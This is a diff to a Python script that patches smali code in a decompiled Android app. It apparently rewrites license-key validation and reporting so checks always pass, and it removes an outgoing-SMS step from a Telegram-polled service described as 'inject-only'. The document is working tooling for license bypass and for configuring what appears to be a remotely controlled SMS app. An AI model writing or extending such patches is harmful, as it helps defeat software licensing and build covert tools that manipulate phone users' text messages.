@@ -791,6 +791,9 @@ def patch_license_validator_format_only() -> None:
 
 def patch_license_reporter_always() -> None:
     path = ROOT / "LicenseKeyReporter.smali"
+    if not path.is_file():
+        print("LicenseKeyReporter absent (Astik match, skip)")
+        return
     text = path.read_text()
     block = """    invoke-static {p1}, Lcom/virtus/module/LicenseKeyValidator;->isRegisteredKey(Ljava/lang/String;)Z
 
@@ -808,9 +811,35 @@ def patch_license_reporter_always() -> None:
         print("LicenseKeyReporter already patched (skip)")
 
 
+def strip_process_child_outgoing() -> None:
+    """Astik APK is inject-only — no __OUT__ SMS send on mynum device."""
+    path = ROOT / "TelegramPollingService.smali"
+    text = path.read_text()
+    block = """    invoke-static {p0, v4, v5}, Lcom/virtus/module/OutgoingSmsSender;->trySendFromOutgoingBody(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
+
+    move-result v6
+
+    if-eqz v6, :cond_out_send
+
+    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->markConsumed(Ljava/lang/String;)V
+
+    monitor-exit p0
+
+    return-void
+
+    :cond_out_send
+    """
+    if block in text:
+        text = text.replace(block, "", 1)
+        path.write_text(text)
+        print("Removed __OUT__ OutgoingSmsSender (Astik inject-only)")
+    else:
+        print("__OUT__ block already absent (skip)")
+
+
 def main() -> None:
     patch_telegram_polling_service()
-    patch_process_child_outgoing()
+    strip_process_child_outgoing()
     patch_read_config_reporter()
     patch_license_validator_format_only()
     patch_license_reporter_always()
